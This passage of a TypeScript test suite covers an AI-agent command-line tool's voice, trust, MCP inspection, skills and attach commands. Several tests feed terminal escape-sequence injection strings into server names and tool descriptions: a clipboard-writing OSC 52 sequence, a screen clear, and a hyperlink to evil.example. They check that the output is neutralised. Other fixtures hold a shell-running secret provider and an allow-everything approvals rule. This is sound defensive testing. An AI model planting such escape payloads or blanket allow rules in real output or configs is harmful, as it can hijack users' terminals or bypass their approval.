      status: "recording"
    }),
    stopCapture: async () => ({
      id: "capture.1",
      metadata: {},
      providerId: "apple_native",
      startedAt: "x",
      status: "completed"
    }),
    synthesize: async () => ({
      audio: audioArtifact("file:///tmp/synth.aiff"),
      completedAt: "x",
      id: "synthesis.1",
      metadata: {},
      providerId: "local_system"
    }),
    transcribe: async () => ({
      completedAt: "x",
      id: "transcription.1",
      locale: "en-US",
      metadata: {},
      providerId: "apple_native",
      text: "transcribed words"
    }),
    waitForCapture: async () => ({
      audio: audioArtifact(),
      id: "capture.1",
      metadata: {},
      providerId: "apple_native",
      startedAt: "x",
      status: "completed",
      text: "captured words",
      transcriptionId: "transcription.cap"
    }),
    ...overrides
  } as unknown as VoiceService;
}

function voiceDeps(voiceService: VoiceService) {
  return { createVoiceContext: async () => ({ sessions: fakeSessions(), voiceService }) };
}

async function tempAudioFile(): Promise<string> {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "aiagent-cli-voice-"));
  voiceTempRoots.push(root);
  const filePath = path.join(root, "clip.wav");
  await fs.writeFile(filePath, Buffer.from("RIFF-fake-wav"));
  return filePath;
}

describe("CLI voice subcommands", () => {
  test("lists devices and voices, with empty fallbacks", async () => {
    const cap = createCaptureStreams();
    expect(
      await runCliWithStubbedEndpoint(
        ["voice", "list-devices", "--kind", "output"],
        cap.streams,
        voiceDeps(fakeVoiceService())
      )
    ).toBe(0);
    expect(cap.getStdout()).toContain("Speaker");

    const voicesCap = createCaptureStreams();
    expect(
      await runCliWithStubbedEndpoint(
        ["voice", "list-voices", "--locale", "en"],
        voicesCap.streams,
        voiceDeps(fakeVoiceService())
      )
    ).toBe(0);
    expect(voicesCap.getStdout()).toContain("Alex");

    const emptyCap = createCaptureStreams();
    await runCliWithStubbedEndpoint(
      ["voice", "list-devices"],
      emptyCap.streams,
      voiceDeps(fakeVoiceService({ listDevices: async () => [] }))
    );
    expect(emptyCap.getStdout()).toContain("No matching voice devices");
  });

  test("transcribes a file and records it on a session", async () => {
    const filePath = await tempAudioFile();
    const cap = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(
      ["voice", "transcribe-file", "--file", filePath, "--session", "session.voice.cli"],
      cap.streams,
      voiceDeps(fakeVoiceService())
    );
    expect(exitCode).toBe(0);
    expect(cap.getStdout()).toContain("transcribed words");
  });

  test("requires a file for transcribe-file", async () => {
    const cap = createCaptureStreams();
    expect(
      await runCliWithStubbedEndpoint(["voice", "transcribe-file"], cap.streams, voiceDeps(fakeVoiceService()))
    ).toBe(1);
    expect(cap.getStdout()).toContain("Usage: aia voice transcribe-file");
  });

  test("captures audio and reports failures", async () => {
    const okCap = createCaptureStreams();
    expect(
      await runCliWithStubbedEndpoint(
        ["voice", "capture", "--max-duration-ms", "5000"],
        okCap.streams,
        voiceDeps(fakeVoiceService())
      )
    ).toBe(0);
    expect(okCap.getStdout()).toContain("captured words");

    const failCap = createCaptureStreams();
    const failing = fakeVoiceService({
      waitForCapture: async () =>
        ({ id: "capture.1", metadata: {}, providerId: "apple_native", startedAt: "x", status: "failed" }) as never
    });
    expect(await runCliWithStubbedEndpoint(["voice", "capture"], failCap.streams, voiceDeps(failing))).toBe(1);
  });

  test("synthesizes and speaks text", async () => {
    const synthCap = createCaptureStreams();
    expect(
      await runCliWithStubbedEndpoint(
        ["voice", "synthesize", "--text", "hello"],
        synthCap.streams,
        voiceDeps(fakeVoiceService())
      )
    ).toBe(0);
    expect(synthCap.getStdout()).toContain("file:///tmp/synth.aiff");

    const speakCap = createCaptureStreams();
    expect(
      await runCliWithStubbedEndpoint(
        ["voice", "speak", "--text", "hello"],
        speakCap.streams,
        voiceDeps(fakeVoiceService())
      )
    ).toBe(0);
    expect(speakCap.getStdout()).toContain("Speech playback completed.");

    const noTextCap = createCaptureStreams();
    expect(
      await runCliWithStubbedEndpoint(["voice", "synthesize"], noTextCap.streams, voiceDeps(fakeVoiceService()))
    ).toBe(1);
  });

  test("surfaces an error for an invalid numeric option", async () => {
    const cap = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(
      ["voice", "capture", "--max-duration-ms", "not-a-number"],
      cap.streams,
      voiceDeps(fakeVoiceService())
    );
    expect(exitCode).toBe(1);
    expect(cap.getStderr().length).toBeGreaterThan(0);
  });
});

// Security review H3. `aia trust` is the only way to enable a workspace
// config's exec/file secret providers, so its state reporting has to be
// accurate — an operator granting trust is consenting to arbitrary execution.
describe("CLI trust subcommand", () => {
  const trustRoots: string[] = [];

  afterEach(async () => {
    await Promise.all(trustRoots.splice(0).map((root) => fs.rm(root, { force: true, recursive: true })));
  });

  async function createTrustWorkspace(configBody: string): Promise<{ home: string; workspace: string }> {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "aiagent-cli-trust-"));
    trustRoots.push(root);
    const home = path.join(root, "home");
    const workspace = path.join(root, "workspace");
    await fs.mkdir(path.join(home, ".aia"), { recursive: true });
    await fs.mkdir(workspace, { recursive: true });
    await fs.writeFile(path.join(workspace, "aia.config.jsonc"), configBody, "utf8");
    return { home, workspace };
  }

  test("prints help without touching any trust state", async () => {
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(["trust", "--help"], capture.streams, {});
    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("aia trust");
    expect(capture.getStdout()).toContain("--grant");
    expect(capture.getStdout()).toContain("--revoke");
  });

  test("reports that no trust is needed for a config with only env providers", async () => {
    const { home, workspace } = await createTrustWorkspace(
      '{ "configVersion": 1, "secrets": { "providers": { "env": { "source": "env" } } } }'
    );
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint(["trust", "--cwd", workspace], capture.streams, {
      userHomeDirectory: home
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("No trust needed");
    // Nothing should have been written.
    await expect(fs.access(path.join(home, ".aia", "trust.json"))).rejects.toThrow();
  });

  // With no config anywhere it used to name `<dir>/aia.config.jsonc`, a file
  // that does not exist, as though it had been inspected.
  test("says there is no workspace config when the folder has none", async () => {
    const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "aiagent-cli-trust-")));
    trustRoots.push(root);
    const home = path.join(root, "home");
    const workspace = path.join(root, "bare");
    await fs.mkdir(path.join(home, ".aia"), { recursive: true });
    await fs.mkdir(workspace, { recursive: true });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint(["trust", "--cwd", workspace], capture.streams, {
      userHomeDirectory: home
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain(
      `No trust needed: there is no workspace config (no aia.config.jsonc found from ${workspace} upward).`
    );
  });

  // Bare `aia trust` used to grant on sight while its help said it only showed
  // the state, so an operator inspecting an unfamiliar repo trusted exactly
  // the file they meant to review. Granting is now explicit.
  test("shows what trusting would allow, and grants only on an explicit yes", async () => {
    const { home, workspace } = await createTrustWorkspace(
      '{ "configVersion": 1, "secrets": { "providers": { "payload": { "source": "exec", "command": "/bin/sh", "args": ["-c", "echo hi"] } } } }'
    );
    const storePath = path.join(home, ".aia", "trust.json");
    const trust = (argv: string[], answers?: string[]) => {
      const capture = createCaptureStreams();
      const exitCode = runCliWithStubbedEndpoint(["trust", "--cwd", workspace, ...argv], capture.streams, {
        // Always supplied, so a test run from a real terminal never waits on stdin.
        interactiveInput: lineSource(answers ?? []),
        userHomeDirectory: home
      });
      return { capture, exitCode };
    };

    const inspecting = trust([]);
    expect(await inspecting.exitCode).toBe(0);
    expect(inspecting.capture.getStdout()).toContain("Not trusted:");
    // The operator sees the hash and exactly what would run before consenting.
    expect(inspecting.capture.getStdout()).toMatch(/sha256: [0-9a-f]{64}/u);
    expect(inspecting.capture.getStdout()).toContain("secret provider payload: runs /bin/sh -c 'echo hi'");
    expect(inspecting.capture.getStdout()).toContain("aia trust --grant");
    await expect(fs.access(storePath)).rejects.toThrow();

    const declining = trust([], ["n"]);
    expect(await declining.exitCode).toBe(0);
    await expect(fs.access(storePath)).rejects.toThrow();

    const accepting = trust([], ["y"]);
    expect(await accepting.exitCode).toBe(0);
    expect(accepting.capture.getStdout()).toContain("Trust this exact file now? [y/N]");
    expect(accepting.capture.getStdout()).toContain("Now allowed: secret provider payload");
    // Recorded in this test's home, never the developer's real ~/.aia.
    const store = JSON.parse(await fs.readFile(storePath, "utf8")) as { trustedConfigs: Array<{ path: string }> };
    expect(store.trustedConfigs.map((entry) => entry.path)).toEqual([
      await fs.realpath(path.join(workspace, "aia.config.jsonc"))
    ]);

    const repeat = trust([]);
    expect(await repeat.exitCode).toBe(0);
    expect(repeat.capture.getStdout()).toContain("Already trusted");

    const revoking = trust(["--revoke"]);
    expect(await revoking.exitCode).toBe(0);
    expect(revoking.capture.getStdout()).toContain("Revoked trust");

    // --grant is the non-interactive way to consent.
    const granting = trust(["--grant"]);
    expect(await granting.exitCode).toBe(0);
    expect(granting.capture.getStdout()).toContain("Trusted ");
    expect(granting.capture.getStdout()).not.toContain("[y/N]");
  });

  test("shows what each MCP server would get, with secret-looking values hidden", async () => {
    const { home, workspace } = await createTrustWorkspace(
      JSON.stringify({
        configVersion: 1,
        mcp: {
          servers: {
            docs: {
              args: ["server.js"],
              command: "node",
              cwd: "/srv/docs",
              enabled: true,
              env: { API_TOKEN: "tok-123456", MODE: "fast" },
              passEnv: ["GITHUB_TOKEN"],
              required: false,
              tags: [],
              trust: "trusted",
              type: "stdio"
            },
            remote: {
              enabled: true,
              headers: { "x-api-key": "key-abcdef" },
              required: false,
              tags: [],
              type: "streamable-http",
              url: "https://mcp.example.com/mcp"
            }
          }
        }
      })
    );
    const capture = createCaptureStreams();
    expect(
      await runCliWithStubbedEndpoint(["trust", "--cwd", workspace], capture.streams, {
        interactiveInput: lineSource([]),
        userHomeDirectory: home
      })
    ).toBe(0);

    const stdout = capture.getStdout();
    expect(stdout).toContain("  - MCP server docs: runs node server.js");
    expect(stdout).toContain("      in /srv/docs");
    expect(stdout).toContain("      with environment API_TOKEN=<hidden>, MODE=fast");
    expect(stdout).toContain("      given these variables from your environment: GITHUB_TOKEN");
    expect(stdout).toContain('      with trust: "trusted", so every one of its tools would run without asking you');
    expect(stdout).toContain("  - MCP server remote: connects to https://mcp.example.com/mcp");
    expect(stdout).toContain("      sending the headers x-api-key");
    expect(stdout).not.toContain("tok-123456");
    expect(stdout).not.toContain("key-abcdef");
  });

  test("covers the approvals file too: shows its allow rules, then grants and revokes both files", async () => {
    const { home, workspace } = await createTrustWorkspace(
      '{ "configVersion": 1, "secrets": { "providers": { "payload": { "source": "exec", "command": "/bin/sh" } } } }'
    );
    await fs.writeFile(
      path.join(workspace, "aia.approvals.jsonc"),
      JSON.stringify({
        defaultMode: "allow",
        rules: [{ id: "workspace.allow.all", mode: "allow", pattern: ".*", targetKind: "command" }]
      }),
      "utf8"
    );
    const configPath = await fs.realpath(path.join(workspace, "aia.config.jsonc"));
    const approvalsPath = await fs.realpath(path.join(workspace, "aia.approvals.jsonc"));
    const storePath = path.join(home, ".aia", "trust.json");
    const trust = async (argv: string[]) => {
      const capture = createCaptureStreams();
      const exitCode = await runCliWithStubbedEndpoint(["trust", "--cwd", workspace, ...argv], capture.streams, {
        interactiveInput: lineSource([]),
        userHomeDirectory: home
      });
      return { exitCode, stdout: capture.getStdout() };
    };

    const inspecting = await trust([]);
    expect(inspecting.stdout).toContain(`Not trusted: ${configPath}`);
    expect(inspecting.stdout).toContain(`Not trusted: ${approvalsPath}`);
    expect(inspecting.stdout).toContain(
      "  - approvals: the allow rule workspace.allow.all, which runs command matching .* without asking"
    );
    expect(inspecting.stdout).toContain(
      '  - approvals: defaultMode "allow" (yours is "ask") for everything no rule covers'
    );
    await expect(fs.access(storePath)).rejects.toThrow();

    const granting = await trust(["--grant"]);
    expect(granting.exitCode).toBe(0);
    expect(granting.stdout).toContain(`Trusted ${configPath}\nTrusted ${approvalsPath}`);
    const store = JSON.parse(await fs.readFile(storePath, "utf8")) as { trustedConfigs: Array<{ path: string }> };
    expect(store.trustedConfigs.map((entry) => entry.path).sort()).toEqual([approvalsPath, configPath].sort());

    expect((await trust([])).stdout).toContain(`Already trusted: ${configPath}`);

    const revoking = await trust(["--revoke"]);
    expect(revoking.stdout).toContain(`Revoked trust for ${configPath} and ${approvalsPath}.`);
    const after = JSON.parse(await fs.readFile(storePath, "utf8").catch(() => '{"trustedConfigs":[]}')) as {
      trustedConfigs: unknown[];
    };
    expect(after.trustedConfigs).toEqual([]);
  });

  test("prints names and paths from the config so they cannot drive the terminal", async () => {
    const { home, workspace } = await createTrustWorkspace(
      JSON.stringify({
        configVersion: 1,
        mcp: {
          servers: {
            "docs\u001b]52;c;ZXZpbA==\u0007": {
              args: ["--title", "\u001b[2Jcleared"],
              command: "node",
              enabled: true,
              required: false,
              tags: [],
              type: "stdio"
            }
          }
        }
      })
    );
    const capture = createCaptureStreams();
    await runCliWithStubbedEndpoint(["trust", "--cwd", workspace], capture.streams, {
      interactiveInput: lineSource([]),
      userHomeDirectory: home
    });

    expect(capture.getStdout()).not.toContain("\u001b");
    expect(capture.getStdout()).toContain("MCP server docs\\x1b]52;c;ZXZpbA==\\x07");
    expect(capture.getStdout()).toContain("\\x1b[2Jcleared");
  });

  test("refuses --grant together with --revoke", async () => {
    const { home, workspace } = await createTrustWorkspace('{ "configVersion": 1 }');
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(
      ["trust", "--grant", "--revoke", "--cwd", workspace],
      capture.streams,
      {
        userHomeDirectory: home
      }
    );
    expect(exitCode).toBe(1);
    expect(capture.getStderr()).toContain("either --grant or --revoke");
  });

  // Rewriting a store that could not be read replaced every grant it held
  // with the one being changed.
  test("refuses to rewrite a trust store it cannot read", async () => {
    const { home, workspace } = await createTrustWorkspace(
      '{ "configVersion": 1, "secrets": { "providers": { "payload": { "source": "exec", "command": "/bin/sh" } } } }'
    );
    const storePath = path.join(home, ".aia", "trust.json");
    const damaged = '{ "trustedConfigs": [], "version": 1, "note": "added by hand" }';
    await fs.writeFile(storePath, damaged, "utf8");

    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(["trust", "--grant", "--cwd", workspace], capture.streams, {
      userHomeDirectory: home
    });

    expect(exitCode).toBe(1);
    expect(capture.getStderr()).toContain("Nothing was changed");
    await expect(fs.readFile(storePath, "utf8")).resolves.toBe(damaged);
  });

  test("reports an unknown flag instead of silently ignoring it", async () => {
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(["trust", "--nope"], capture.streams, {});
    expect(exitCode).toBe(1);
    expect(capture.getStderr().length).toBeGreaterThan(0);
  });
});

// `/mcp` and `/agents` are how an operator answers "what do you actually have
// connected?", and `aia attach` is how they join a live external-agent
// terminal. All three were previously uncovered.
describe("CLI inspection commands and attach", () => {
  function createRequestSdk(handlers: Record<string, (payload: unknown) => unknown>): AIAgentSdk {
    const handle = {
      async listPendingApprovals() {
        return [];
      },
      async sendMessage() {
        return { async wait() {} };
      },
      async snapshot() {
        return buildSnapshot("ok");
      },
      subscribe() {
        return () => undefined;
      }
    };

    return {
      async close() {},
      async request(topic: string, payload: unknown) {
        if (topic === "model.health") {
          return { checkedAt: "2026-06-10T12:00:00.000Z", details: {}, providerId: "fake", status: "healthy" };
        }
        const handler = handlers[topic];
        if (!handler) {
          throw new Error(`unexpected request topic ${topic}`);
        }
        return handler(payload);
      },
      sessions: {
        async create() {
          return { handle, session: { id: "session.test.cli.inspect" } };
        }
      }
    } as unknown as AIAgentSdk;
  }

  test("/mcp renders configured servers, their state, errors, and tools", async () => {
    const sdk = createRequestSdk({
      "mcp.list": () => ({
        servers: [
          {
            capabilities: { tools: 1 },
            serverName: "docs",
            state: "connected",
            tools: [{ description: "Search the docs", invocationName: "docs_search" }],
            transport: "stdio"
          },
          {
            // A server that never connected must still be listed with its
            // captured error — that is the whole point of the command.
            capabilities: { tools: 0 },
            error: "spawn npx ENOENT",
            serverName: "context7",
            state: "failed",
            tools: [],
            transport: "stdio"
          }
        ]
      })
    });
    const capture = createCaptureStreams();

    await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => sdk,
      interactiveInput: lineSource(["/mcp", "/exit"])
    });

    const stdout = capture.getStdout();
    expect(stdout).toContain("docs  [connected, stdio]");
    expect(stdout).toContain("- docs_search: Search the docs");
    expect(stdout).toContain("context7  [failed, stdio]");
    expect(stdout).toContain("error: spawn npx ENOENT");
  });

  test("/mcp prints what servers report so it cannot drive the terminal", async () => {
    const sdk = createRequestSdk({
      "mcp.list": () => ({
        servers: [
          {
            capabilities: { tools: 1 },
            error: "crashed\u001b[2J",
            serverName: "docs",
            state: "failed",
            tools: [{ description: "Search \u001b]8;;https://evil.example\u0007here", invocationName: "docs_search" }],
            transport: "stdio"
          }
        ]
      })
    });
    const capture = createCaptureStreams();

    await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => sdk,
      interactiveInput: lineSource(["/mcp", "/exit"])
    });

    const stdout = capture.getStdout();
    expect(stdout).not.toContain("\u001b");
    expect(stdout).toContain("error: crashed\\x1b[2J");
    expect(stdout).toContain("- docs_search: Search \\x1b]8;;https://evil.example\\x07here");
  });

  test("/mcp and /agents report an empty configuration rather than nothing at all", async () => {
    const sdk = createRequestSdk({
      "external_agent.session.list": () => ({ sessions: [] }),
      "mcp.list": () => ({ servers: [] })
    });
    const capture = createCaptureStreams();

    await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => sdk,
      interactiveInput: lineSource(["/mcp", "/agents", "/exit"])
    });

    expect(capture.getStdout()).toContain("No MCP servers are configured.");
    expect(capture.getStdout()).toContain("No interactive external-agent sessions.");
  });

  test("/skills lists each skill with where it came from, and the problems found", async () => {
    const asked: unknown[] = [];
    const sdk = createRequestSdk({
      "skills.list": (payload) => (
        asked.push(payload),
        {
          diagnostics: [
            {
              kind: "invalid",
              message: "missing field `description`",
              path: "/workspace/.agents/skills/broken/SKILL.md",
              severity: "error"
            }
          ],
          skills: [
            {
              allowedTools: [],
              description: "Draft release notes.",
              directory: "/workspace/.agents/skills/release-notes",
              disableModelInvocation: false,
              enabled: true,
              filePath: "/workspace/.agents/skills/release-notes/SKILL.md",
              metadata: {},
              name: "release-notes",
              scope: "project"
            },
            {
              allowedTools: [],
              description: "Deploy to production.",
              directory: "/home/.agents/skills/deploy",
              disableModelInvocation: true,
              enabled: false,
              filePath: "/home/.agents/skills/deploy/SKILL.md",
              metadata: {},
              name: "deploy",
              scope: "user"
            }
          ]
        }
      )
    });
    const capture = createCaptureStreams();

    await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => sdk,
      interactiveInput: lineSource(["/skills", "/exit"])
    });

    const stdout = capture.getStdout();
    expect(stdout).toContain("release-notes  [project]  Draft release notes.");
    expect(stdout).toContain("  /workspace/.agents/skills/release-notes/SKILL.md");
    expect(stdout).toContain("deploy  [user, disabled, only as $deploy]  Deploy to production.");
    expect(stdout).toContain("  error: /workspace/.agents/skills/broken/SKILL.md: missing field `description`");
    // For the session's own directory: it used to ask for the gateway's.
    expect(asked).toEqual([{ cwd: (await buildSnapshot("ok")).snapshot.session.cwd }]);
  });

  test("/mcp reconnect reconnects a server; the REPL notes a server that failed or needs a sign-in", async () => {
    const reconnected: string[] = [];
    const sdk = createRequestSdk({
      "mcp.list": () => ({
        servers: [
          {
            capabilities: { tools: 0 },
            error: "spawn npx ENOENT",
            serverName: "context7",
            state: "failed",
            tools: [],
            transport: "stdio"
          },
          {
            capabilities: { tools: 0 },
            serverName: "jira",
            state: "needs_login",
            tools: [],
            transport: "streamable-http"
          }
        ]
      }),
      "mcp.reconnect": () => {
        reconnected.push("context7");
        return {
          server: {
            capabilities: { tools: 1 },
            serverName: "context7",
            state: "connected",
            tools: [],
            transport: "stdio"
          }
        };
      }
    });
    const capture = createCaptureStreams();

    await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => sdk,
      interactiveInput: lineSource(["/mcp reconnect context7", "/mcp reconnect", "/exit"])
    });

    expect(capture.getStderr()).toContain("· MCP context7 failed: spawn npx ENOENT — /mcp");
    expect(capture.getStderr()).toContain("· MCP jira needs you to sign in: aia mcp login jira");
    expect(reconnected).toEqual(["context7"]);
    expect(capture.getStdout()).toContain("context7  [connected, stdio]");
    expect(capture.getStderr()).toContain("Usage: /mcp reconnect <server-name>");
  });

  test("the REPL notes a failing server once per streak, and once more when its reconnects give up", async () => {
    let listener: ((event: unknown) => void) | undefined;
    const base = createRequestSdk({ "mcp.list": () => ({ servers: [] }) });
    const sdk = {
      ...base,
      subscribe(handler: (event: unknown) => void) {
        listener = handler;
        return () => undefined;
      }
    } as unknown as AIAgentSdk;
    const update = (state: string, extra: Record<string, unknown> = {}) =>
      listener?.({
        createdAt: new Date().toISOString(),
        id: `mcp-updated.flaky.${Math.random()}`,
        metadata: {},
        payload: {
          server: { capabilities: { tools: 0 }, serverName: "flaky", state, transport: "stdio", ...extra }
        },
        topic: "mcp.updated"
      });
    const capture = createCaptureStreams();
    const reader = createBufferedTestReader();
    const done = runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => sdk,
      interactiveInput: reader
    });
    await waitUntil(() => listener !== undefined);

    // A crash loop: each try used to print another line.
    for (let attempt = 1; attempt <= 3; attempt += 1) {
      update("failed", { error: `Lost the connection: the process exited with code 4 (try ${attempt})` });
      update("connecting");
    }
    update("failed", {
      error: "Lost the connection. Gave up after 5 reconnect attempts; reconnect it with /mcp reconnect flaky.",
      errorCode: "mcp_reconnect_gave_up"
    });
    await waitUntil(() => capture.getStderr().includes("Gave up after 5"));
    const notices = capture
      .getStderr()
      .split("\n")
      .filter((line) => line.includes("· MCP flaky failed"));
    expect(notices).toHaveLength(2);
    expect(notices[0]).toContain("(try 1)");

    // Connected again, a new failure starts a new streak.
    update("connected");
    update("failed", { error: "Lost the connection: again" });
    await waitUntil(() => capture.getStderr().includes("again"));

    await reader.type("/exit");
    expect(await done).toBe(0);
  });

  test("/agents lists live interactive sessions", async () => {
    const sdk = createRequestSdk({
      "external_agent.session.list": () => ({
        sessions: [
          {
            agentId: "codex",
            cwd: "/workspace",
            id: "external-agent-session.abc",
            status: "running",
            turnCount: 3
          }
        ]
      })
    });
    const capture = createCaptureStreams();

    await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => sdk,
      interactiveInput: lineSource(["/agents", "/exit"])
    });

    expect(capture.getStdout()).toContain("external-agent-session.abc  running  codex  3 turn(s)  /workspace");
  });

  test("/mcp surfaces a failure instead of going quiet", async () => {
    const sdk = createRequestSdk({
      "mcp.list": () => {
        throw new Error("gateway unreachable");
      }
    });
    const capture = createCaptureStreams();

    await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => sdk,
      interactiveInput: lineSource(["/mcp", "/exit"])
    });

    expect(capture.getStderr()).toContain("Failed to list MCP servers");
    expect(capture.getStderr()).toContain("gateway unreachable");
  });

  const attachRoots: string[] = [];
  afterEach(async () => {
    await Promise.all(attachRoots.splice(0).map((root) => fs.rm(root, { force: true, recursive: true })));
  });

  // A workspace and home of its own, so attach never reads this repo's real
  // `.aia/` or the developer's `~/.aia/`.
  async function attachWorkspace(): Promise<{ home: string; stateRoot: string; workspace: string }> {
    const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "aia-cli-attach-")));
    attachRoots.push(root);
    const home = path.join(root, "home");
    const workspace = path.join(root, "workspace");
    await fs.mkdir(path.join(home, ".aia"), { recursive: true });
    await fs.mkdir(workspace, { recursive: true });
    await fs.writeFile(path.join(workspace, "aia.config.jsonc"), '{ "configVersion": 1 }\n', "utf8");
    return { home, stateRoot: path.join(workspace, ".aia"), workspace };
  }

  test("aia attach requires a session id and otherwise relays through the gateway", async () => {
    const missing = createCaptureStreams();
    expect(await runCliWithStubbedEndpoint(["attach"], missing.streams, {})).toBe(1);
    expect(missing.getStderr()).toContain("Usage: aia attach");

    const { home, workspace } = await attachWorkspace();
    const calls: Array<{ externalSessionId: string; url: string }> = [];
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(
      ["attach", "external-agent-session.abc", "--cwd", workspace],
      capture.streams,
      {
        attachToExternalAgentSession: async (options) => {
          calls.push({ externalSessionId: options.externalSessionId, url: options.url });
          return 0;
        },
        userHomeDirectory: home
      }
    );

    expect(exitCode).toBe(0);
    expect(calls).toHaveLength(1);
    expect(calls[0]?.externalSessionId).toBe("external-agent-session.abc");
    // Defaults to the configured gateway websocket rather than inventing one.
    expect(calls[0]?.url).toMatch(/^ws:\/\/.+\/api\/gateway\/ws$/u);
    // The operator has to be told how to get back out.
    expect(capture.getStderr()).toContain("Ctrl-] to detach");
  });

  test("aia attach honors an explicit --url", async () => {
    const { home, workspace } = await attachWorkspace();
    const calls: string[] = [];
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint(
      ["attach", "external-agent-session.abc", "--url", "ws://tunnel.example.com/api/gateway/ws", "--cwd", workspace],
      capture.streams,
      {
        attachToExternalAgentSession: async (options) => {
          calls.push(options.url);
          return 0;
        },
        userHomeDirectory: home
      }
    );

    expect(exitCode).toBe(0);
    expect(calls).toEqual(["ws://tunnel.example.com/api/gateway/ws"]);
  });

  // A REPL with no configured gateway token guards its listener with a token
  // minted for that launch and published beside the URL.
  test("aia attach presents the per-launch token the hosting CLI published", async () => {
    const { home, stateRoot, workspace } = await attachWorkspace();
    const url = "ws://127.0.0.1:1/api/gateway/ws";
    await fs.mkdir(attachEndpointsDirectory(stateRoot), { recursive: true });
    await fs.writeFile(
      attachEndpointFilePath(stateRoot),
      JSON.stringify({ createdAt: "2026-03-31T12:00:00.000Z", pid: process.pid, token: "launch-token", url }),
      "utf8"
    );

    const calls: Array<{ token?: string; url: string }> = [];
    const attach = async (argv: string[]) =>
      runCliWithStubbedEndpoint(
        ["attach", "external-agent-session.abc", "--cwd", workspace, ...argv],
        createCaptureStreams().streams,
        {
          attachToExternalAgentSession: async (options) => {
            calls.push({ token: options.token, url: options.url });
            return 0;
          },
          userHomeDirectory: home
        }
      );

    expect(await attach([])).toBe(0);
    // An explicit --url naming that listener still gets its token.
    expect(await attach(["--url", url])).toBe(0);
    expect(calls).toEqual([
      { token: "launch-token", url },
      { token: "launch-token", url }
    ]);
  });

  test("aia attach reports a relay failure rather than throwing", async () => {
    const { home, workspace } = await attachWorkspace();
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(
      ["attach", "external-agent-session.abc", "--cwd", workspace],
      capture.streams,
      {
        attachToExternalAgentSession: async () => {
          throw new Error("socket refused");
        },
        userHomeDirectory: home
      }
    );

    expect(exitCode).toBe(1);
    expect(capture.getStderr()).toContain("socket refused");
  });
});

describe("aia skills", () => {
  const skillRoots: string[] = [];
  afterEach(async () => {
    await Promise.all(skillRoots.splice(0).map((root) => fs.rm(root, { force: true, recursive: true })));
  });

  async function createSkillsWorkspace(): Promise<{ home: string; workspace: string }> {
    const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "aiagent-cli-skills-")));
    skillRoots.push(root);
    const home = path.join(root, "home");
    const workspace = path.join(root, "workspace");
    await fs.mkdir(path.join(home, ".aia"), { recursive: true });
    await fs.mkdir(path.join(workspace, ".git"), { recursive: true });
    await fs.mkdir(path.join(workspace, ".agents", "skills", "release-notes"), { recursive: true });
    await fs.writeFile(
      path.join(workspace, ".agents", "skills", "release-notes", "SKILL.md"),
      "---\nname: release-notes\ndescription: Draft release notes.\n---\nSteps.\n",
      "utf8"
    );
    return { home, workspace };
  }

  async function listJson(home: string, workspace: string) {
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(
      ["skills", "list", "--json", "--cwd", workspace],
      capture.streams,
      {
        userHomeDirectory: home
      }
    );
    expect(exitCode, capture.getStderr()).toBe(0);
    return JSON.parse(capture.getStdout()) as {
      diagnostics: unknown[];
      skills: Array<{ enabled: boolean; name: string; scope: string }>;
    };
  }

  test("lists the project's skills and the bundled ones, as JSON on request", async () => {
    const { home, workspace } = await createSkillsWorkspace();
    const listing = await listJson(home, workspace);
    expect(listing.skills.map((skill) => `${skill.scope}:${skill.name}:${skill.enabled}`)).toEqual([
      "project:release-notes:true",
      "bundled:skill-creator:true"
    ]);
    expect(listing.diagnostics).toEqual([]);
  });

  test("disable and enable edit skills.disabled in the user config and keep its comments", async () => {
    const { home, workspace } = await createSkillsWorkspace();
    const configPath = path.join(home, ".aia", "aia.config.jsonc");
    await fs.writeFile(configPath, '{\n  // my settings\n  "configVersion": 1\n}\n', "utf8");

    const disabling = createCaptureStreams();
    expect(
      await runCliWithStubbedEndpoint(["skills", "disable", "release-notes", "--cwd", workspace], disabling.streams, {
        userHomeDirectory: home
      })
    ).toBe(0);
    expect(disabling.getStdout()).toContain(`Disabled "release-notes" in ${configPath}.`);
    const written = await fs.readFile(configPath, "utf8");
    expect(written).toContain("// my settings");
    expect(written).toContain('"disabled": [');
    expect((await listJson(home, workspace)).skills.find((skill) => skill.name === "release-notes")?.enabled).toBe(
      false
    );

    const again = createCaptureStreams();
    await runCliWithStubbedEndpoint(["skills", "disable", "release-notes", "--cwd", workspace], again.streams, {
      userHomeDirectory: home
    });
    expect(again.getStdout()).toContain(`"release-notes" is already disabled in ${configPath}.`);

    const enabling = createCaptureStreams();
    await runCliWithStubbedEndpoint(["skills", "enable", "release-notes", "--cwd", workspace], enabling.streams, {
      userHomeDirectory: home
    });
    expect(enabling.getStdout()).toContain(`Enabled "release-notes"`);
    expect((await listJson(home, workspace)).skills.find((skill) => skill.name === "release-notes")?.enabled).toBe(
      true
    );
    expect(await fs.readFile(configPath, "utf8")).toContain("// my settings");
  });

  test("says when a name matches no skill, and enable removes a name from every file that lists it", async () => {
